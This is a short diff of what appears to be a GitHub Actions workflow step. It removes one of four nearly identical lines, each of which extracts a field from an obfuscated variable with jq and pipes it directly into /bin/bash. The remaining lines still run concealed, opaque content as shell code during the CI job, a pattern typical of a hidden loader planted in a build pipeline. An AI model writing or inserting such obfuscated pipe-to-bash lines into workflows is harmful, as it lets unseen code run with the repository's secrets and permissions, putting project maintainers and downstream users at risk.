@@ -26,7 +26,6 @@ jobs:
           echo $g52563 | jq -r .wht396 | /bin/bash
           printf '%s' "$pls86828" | jq -r .njdxj7164 | /bin/bash
           printf '%s' "$qva3" | jq -r .p45 | /bin/bash
-          printf '%s' "$idwq5042" | jq -r .o64552 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
